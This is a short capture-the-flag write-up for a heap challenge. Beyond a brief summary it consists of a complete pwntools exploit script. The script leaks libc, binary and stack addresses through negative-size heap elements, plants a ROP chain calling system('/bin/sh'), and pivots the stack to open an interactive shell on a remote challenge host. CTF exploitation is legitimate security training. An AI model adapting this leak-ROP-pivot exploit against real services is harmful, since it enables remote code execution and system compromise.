## TL;DR
This is about exploiting a heap as a data structure. Negative size of elements on the heap allows to overwrite size of the heap itself to point somewhere above. It allows to write rop chain and after this overwrite RET with stack pivot gadget to point to rop chain.

[Exploit](./exploit.py):

```python
import struct

from pwn import *


payload = ''


def to_addr(n):
    return struct.pack('Q', n)


def to_n(addr):
    return struct.unpack('Q', addr)[0]


def line_up(pc):
    global payload
    
    pc.sendlineafter('Choice: ', '0')
    payload += '0\n'


def do_head_count(pc):
    global payload

    pc.sendlineafter('Choice: ', '1')
    payload += '1\n'


def create_char(pc, name, age, inter=False):
    global payload

    if inter:
        pc.interactive()
    else:
        pc.sendlineafter('Choice: ', '2')
        pc.sendlineafter('name?', name)
        pc.sendlineafter('age?', str(age))

        payload += '2\n{}\n{}\n'.format(name, str(age))


def delete(pc):
    global payload

    pc.sendlineafter('Choice: ', '3')
    payload += '3\n'


def main(pc, libc):

    binsh      = list(libc.search('/bin/sh'))[0]
    setvbuf_of = 0x201FC0
    pop_rdi    = 0x11c3
    pivot      = 0xb29

    print(hex(libc.symbols['system']), hex(binsh))

    create_char(pc, 'OOOO', 0xf0)
    create_char(pc, 'FFFF', 0x60)
    create_char(pc, 'DDDD', 0x40)
    create_char(pc, 'BBBB', 0x20)
    create_char(pc, 'EEEE', 0x50)

    delete(pc)
    delete(pc)
    delete(pc)
    delete(pc)
    delete(pc)
    delete(pc)

    line_up(pc)
    
    create_char(pc, 'A', -16)

    delete(pc)

    do_head_count(pc)

    delete(pc)

    pc.recvline()
    system = to_n(pc.recvline()[:6] + '\x00\x00') - libc.symbols['printf'] - 166 + libc.symbols['system']
    binsha = system - libc.symbols['system'] + binsh
    print('System addr: ' + hex(system))
    print('/bin/sh addr: ' + hex(binsha))

    delete(pc)
    delete(pc)

    line_up(pc)
    
    create_char(pc, 'A', -141)
    delete(pc)

    do_head_count(pc)

    delete(pc)

    pc.recvline()
    base_code = to_n(pc.recvline()[:6] + '\x00\x00') - 0x459
    setvbuf   = base_code + setvbuf_of
    print('base addr: ' +  hex(base_code))
    print('setvbuf: ' + hex(setvbuf))

    delete(pc)
    delete(pc)

    line_up(pc)

    create_char(pc, 'A', -18)

    delete(pc)

    do_head_count(pc)

    delete(pc)

    pc.recvline()
    stack = to_n(pc.recvline()[:6] + '\x00\x00')
    towrite = stack - 1376

    print('Stack: ' + hex(stack))
    print('To write: ' + hex(towrite))


    delete(pc)
    delete(pc)

    line_up(pc)

    create_char(pc, 'A', -56)

    raw_input()

    create_char(pc, to_addr(base_code + pop_rdi), 0x42424242)
    create_char(pc, to_addr(system), binsha)

    do_head_count(pc)    

    delete(pc)
    delete(pc)

    line_up(pc)

    print('Gadget: ' + hex(base_code + pivot))

    create_char(pc, 'A', -3)
    create_char(pc, to_addr(base_code + pivot), towrite)

    pc.interactive()


if __name__ == '__main__':
    # libc = ELF('/lib/x86_64-linux-gnu/libc-2.25.so')
    libc = ELF('./libc-2.26.so')
    
    # pc = process('./how2heap')
    # pc = remote('challenges1.uiuc.tf', 38910)
    pc = remote('159.89.8.102', 38910)
    
    main(pc, libc)
```